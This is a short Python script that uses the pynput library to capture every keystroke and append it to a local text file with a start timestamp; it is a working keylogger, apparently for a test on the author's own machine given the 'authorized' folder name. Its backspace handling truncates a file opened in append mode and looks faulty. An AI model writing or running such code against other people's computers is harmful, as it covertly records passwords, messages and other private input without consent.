import pynput
from pynput.keyboard import Key, Listener
import datetime

def on_press(key):
    with open("/home/z403/authorized/test.txt", "a") as f:
        if isinstance(key, Key):
            if key == Key.space:
                f.write(" ")
            elif key == Key.enter:
                f.write("\n")
            elif key == Key.backspace:
                f.seek(f.tell() - 1, 0)
                f.truncate()
        else:
            f.write(str(key).strip("'"))

with Listener(on_press=on_press) as listener:
    with open("/home/z403/authorized/test.txt", "a") as f:
        f.write(f"Logging started at: {datetime.datetime.now()}\n")
    listener.join()
